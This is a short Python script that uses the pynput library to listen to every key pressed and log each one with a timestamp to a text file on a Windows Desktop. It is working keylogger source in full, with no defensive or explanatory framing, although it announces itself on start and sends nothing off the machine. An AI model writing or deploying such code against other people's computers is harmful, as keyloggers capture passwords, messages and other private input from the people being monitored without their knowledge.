from pynput.keyboard import Key, Listener
import logging

print("Loging keystrokes")
log_directory = r"C:/Users/Saiprasad/Desktop/"
logging.basicConfig(filename=(log_directory + "log_results.txt"), level=logging.DEBUG,
                    format='%(asctime)s : %(message)s')


def keypress(Key):
    logging.info(str(Key))


with Listener(on_press=keypress) as listener:
    listener.join()
